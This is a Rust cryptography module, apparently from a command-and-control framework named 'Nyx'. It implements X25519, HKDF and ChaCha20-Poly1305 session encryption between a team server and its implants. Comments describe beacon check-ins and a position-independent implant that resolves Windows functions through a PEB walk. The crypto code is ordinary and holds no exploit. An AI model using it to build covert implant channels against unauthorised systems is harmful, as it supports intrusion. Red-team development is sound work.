//! Per-session cryptography: X25519 ECDH key agreement, HKDF, ChaCha20-Poly1305 AEAD.

use alloc::vec::Vec;
use chacha20poly1305::{
    aead::{Aead, Payload},
    ChaCha20Poly1305, KeyInit, Nonce,
};
use hkdf::Hkdf;
use rand_core::RngCore;
use sha2::Sha256;
use x25519_dalek::{PublicKey, StaticSecret};

pub const PUBKEY_LEN: usize = 32;
pub const KEY_LEN: usize = 32;
pub const NONCE_LEN: usize = 12;

/// A 32-byte symmetric key derived per session via ECDH + HKDF.
/// Wrapped so ZeroizeOnDrop can be implemented (orphan rule prevents impl
/// for the bare array type from outside this crate).
#[derive(Clone, Copy, Debug, Eq, PartialEq, Hash)]
pub struct SessionKey([u8; KEY_LEN]);

use zeroize::{Zeroize, ZeroizeOnDrop};

impl SessionKey {
    pub fn new(inner: [u8; KEY_LEN]) -> Self {
        Self(inner)
    }
    pub fn as_bytes(&self) -> &[u8; KEY_LEN] {
        &self.0
    }
}

impl Zeroize for SessionKey {
    fn zeroize(&mut self) {
        self.0.zeroize();
    }
}

impl ZeroizeOnDrop for SessionKey {}

/// Fill 32 bytes from the OS CSPRNG.
///
/// **std build** (server/agent-dev/client): uses `rand_core::OsRng` → `getrandom`
/// → `RtlGenRandom` via normal static linking. Works because these are regular
/// std binaries with a normal import table.
///
/// **no_std build** (PIC implant cdylib): `getrandom`'s `#[link(name="advapi32")]`
/// produces a static import-table entry that the PIC cdylib loader can't resolve
/// → `SystemFunction036` call aborts (`0xC0000409`). So the no_std build uses a
/// **registered CSPRNG callback**: the implant calls [`register_csprng`] during
/// bootstrap with a PEB-walk resolver that dynamically finds `SystemFunction036`
/// (a.k.a. `RtlGenRandom`) in `advapi32.dll` — no static linking, works on every
/// Windows version from XP SP2 through 11 25H2 (SystemFunction036 is the documented
/// stable entry point for the kernel CSPRNG). If no callback is registered,
/// `random_bytes` falls back to `OsRng` (which works on std targets).
#[cfg(feature = "std")]
fn random_bytes(out: &mut [u8; 32]) {
    rand_core::OsRng.fill_bytes(out);
}

/// Registered CSPRNG callback for the no_std PIC implant. Set by the implant's
/// bootstrap via [`register_csprng`]. Stores a raw function pointer in an
/// AtomicUsize (no_std-safe, no Mutex needed — set once at init, read forever).
#[cfg(not(feature = "std"))]
static CSPRNG_HOOK: core::sync::atomic::AtomicUsize = core::sync::atomic::AtomicUsize::new(0);

/// Register a CSPRNG fill function for the no_std build. The implant calls this
/// once during bootstrap, passing a closure that resolves `SystemFunction036`
/// via PEB walk and fills the buffer with cryptographically-secure random bytes.
/// Returning `false` = failure (the caller should abort / treat as fatal).
///
/// **Safety**: `fill` must be safe to call from any thread (the CSPRNG is
/// stateless / thread-safe on Windows). The pointer is stored in an atomic and
/// never freed — it must point to a function that lives for the process lifetime.
#[cfg(not(feature = "std"))]
pub fn register_csprng(fill: fn(&mut [u8]) -> bool) {
    CSPRNG_HOOK.store(fill as usize, core::sync::atomic::Ordering::Release);
}

#[cfg(not(feature = "std"))]
fn random_bytes(out: &mut [u8; 32]) {
    let hook = CSPRNG_HOOK.load(core::sync::atomic::Ordering::Acquire);
    if hook != 0 {
        // SAFETY: the pointer was stored by register_csprng and points to a
        // process-lifetime fn(&mut [u8]) -> bool. Thread-safe (CSPRNG is
        // stateless on Windows).
        let f: fn(&mut [u8]) -> bool = unsafe { core::mem::transmute(hook) };
        f(out);
    } else {
        // Fallback: OsRng (works on std targets; on no_std without a registered
        // hook this will use getrandom's static link — may abort on PIC cdylib).
        rand_core::OsRng.fill_bytes(out);
    }
}

/// The team server's long-term identity keypair. The public half is baked
/// into every implant's config; the secret never leaves the server.
#[derive(Clone)]
pub struct ServerKeypair {
    secret: StaticSecret,
    public: PublicKey,
}

impl ServerKeypair {
    pub fn generate() -> Self {
        let mut bytes = [0u8; 32];
        random_bytes(&mut bytes);
        let secret = StaticSecret::from(bytes);
        let public = PublicKey::from(&secret);
        Self { secret, public }
    }

    pub fn public_bytes(&self) -> [u8; PUBKEY_LEN] {
        self.public.to_bytes()
    }

    /// Serialize the long-term secret so the server identity can persist across
    /// restarts (`NYX_KEYFILE`). The secret never leaves the server.
    pub fn to_secret_bytes(&self) -> [u8; KEY_LEN] {
        self.secret.to_bytes()
    }

    /// Reconstruct the identity from a persisted secret (e.g. read from
    /// `NYX_KEYFILE`). Derives the matching public key.
    pub fn from_secret_bytes(bytes: [u8; KEY_LEN]) -> Self {
        let secret = StaticSecret::from(bytes);
        let public = PublicKey::from(&secret);
        Self { secret, public }
    }

    /// Derive the AEAD session key for a connecting implant whose ephemeral
    /// public key is `implant_pub`. Both sides compute this and must agree.
    pub fn derive_for(&self, implant_pub: &[u8; PUBKEY_LEN]) -> SessionKey {
        let their = PublicKey::from(*implant_pub);
        let shared = self.secret.diffie_hellman(&their);
        derive_session_key(&shared.to_bytes(), &self.public.to_bytes(), implant_pub)
    }
}

/// An implant's per-run keypair.
pub struct ImplantKeypair {
    secret: StaticSecret,
    public: PublicKey,
}

impl ImplantKeypair {
    pub fn generate() -> Self {
        let mut bytes = [0u8; 32];
        random_bytes(&mut bytes);
        let secret = StaticSecret::from(bytes);
        let public = PublicKey::from(&secret);
        Self { secret, public }
    }

    pub fn public_bytes(&self) -> [u8; PUBKEY_LEN] {
        self.public.to_bytes()
    }

    /// Derive the session key given the server's known public key.
    pub fn session_key(&self, server_pub: &[u8; PUBKEY_LEN]) -> SessionKey {
        let server = PublicKey::from(*server_pub);
        let shared = self.secret.diffie_hellman(&server);
        derive_session_key(&shared.to_bytes(), server_pub, &self.public.to_bytes())
    }
}

/// HKDF-SHA256 over the shared secret, bound to both public keys so the
/// resulting key is unique per (implant, server) pair.
pub fn derive_session_key(
    shared: &[u8; 32],
    server_pub: &[u8; PUBKEY_LEN],
    implant_pub: &[u8; PUBKEY_LEN],
) -> SessionKey {
    let hk = Hkdf::<Sha256>::new(None, shared);
    // Stack-allocated info buffer: "nyx-session-v1" (14) + server_pub (32) + implant_pub (32) = 78 bytes.
    // Audit M-4: avoid Vec heap allocation for this small, fixed-size payload.
    let mut info = [0u8; 80];
    let mut pos = 0;
    let label = b"nyx-session-v1";
    info[..label.len()].copy_from_slice(label);
    pos += label.len();
    info[pos..pos + PUBKEY_LEN].copy_from_slice(server_pub);
    pos += PUBKEY_LEN;
    info[pos..pos + PUBKEY_LEN].copy_from_slice(implant_pub);
    pos += PUBKEY_LEN;
    let mut okm = [0u8; KEY_LEN];
    // HKDF expand only fails if the requested length exceeds 255 * HashLen; 32 is fine.
    hk.expand(&info[..pos], &mut okm)
        .expect("32-byte HKDF expand cannot fail");
    SessionKey::new(okm)
}

/// Which direction a frame travels. The session key is shared by both peers,
/// so the two directions **must** use disjoint nonce spaces — otherwise an
/// implant check-in sealed at counter=0 collides with the server reply sealed
/// at send_counter=0 (identical key, nonce, and AAD = the implant pubkey),
/// which is a catastrophic ChaCha20-Poly1305 nonce reuse.
///
/// We separate the spaces by setting a fixed direction discriminator in the
/// top byte of the 96-bit nonce (`nonce[0]`). The counter still occupies
/// `nonce[4..12]`; bytes `[1..4]` stay zero. `ClientToServer` leaves the
/// discriminator at 0 (preserving the historical implant→server nonce); the
/// server→implant direction flips bit 0 of the top byte.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Direction {
    /// Implant → server (beacon check-ins + task responses).
    ClientToServer,
    /// Server → implant (queued-task batches).
    ServerToClient,
}

impl Direction {
    /// The discriminator written into `nonce[0]` to keep the two directions'
    /// nonce spaces disjoint for every counter value.
    const fn discriminator(self) -> u8 {
        match self {
            Direction::ClientToServer => 0x00,
            Direction::ServerToClient => 0x01,
        }
    }
}

/// Build the 96-bit nonce for a given direction + counter.
fn nonce_for(dir: Direction, counter: u64) -> [u8; NONCE_LEN] {
    let mut nonce_bytes = [0u8; NONCE_LEN];
    nonce_bytes[0] = dir.discriminator();
    nonce_bytes[4..12].copy_from_slice(&counter.to_le_bytes());
    nonce_bytes
}

/// AEAD-encrypt `plaintext` under `key` with a direction- and counter-derived
/// nonce. `aad` is authenticated but not encrypted (we bind the session pubkey).
pub fn seal_dir(
    key: &SessionKey,
    dir: Direction,
    counter: u64,
    aad: &[u8],
    plaintext: &[u8],
) -> Vec<u8> {
    let cipher = ChaCha20Poly1305::new(chacha20poly1305::Key::from_slice(key.as_bytes()));
    let nonce_bytes = nonce_for(dir, counter);
    let nonce = Nonce::from_slice(&nonce_bytes);
    cipher
        .encrypt(
            nonce,
            Payload {
                msg: plaintext,
                aad,
            },
        )
        .expect("chacha20poly1305 encrypt is infallible")
}

/// AEAD-decrypt `ciphertext`. Returns `Err` on tag mismatch (tampering / wrong
/// key / wrong direction / wrong counter).
pub fn open_dir(
    key: &SessionKey,
    dir: Direction,
    counter: u64,
    aad: &[u8],
    ciphertext: &[u8],
) -> Result<Vec<u8>, chacha20poly1305::Error> {
    let cipher = ChaCha20Poly1305::new(chacha20poly1305::Key::from_slice(key.as_bytes()));
    let nonce_bytes = nonce_for(dir, counter);
    let nonce = Nonce::from_slice(&nonce_bytes);
    cipher.decrypt(
        nonce,
        Payload {
            msg: ciphertext,
            aad,
        },
    )
}

/// Back-compat shim: seals with [`Direction::ClientToServer`]. Prefer
/// [`seal_dir`] for new call sites so the direction is explicit.
pub fn seal(key: &SessionKey, counter: u64, aad: &[u8], plaintext: &[u8]) -> Vec<u8> {
    seal_dir(key, Direction::ClientToServer, counter, aad, plaintext)
}

/// Back-compat shim: opens with [`Direction::ClientToServer`]. Prefer
/// [`open_dir`] for new call sites so the direction is explicit.
pub fn open(
    key: &SessionKey,
    counter: u64,
    aad: &[u8],
    ciphertext: &[u8],
) -> Result<Vec<u8>, chacha20poly1305::Error> {
    open_dir(key, Direction::ClientToServer, counter, aad, ciphertext)
}
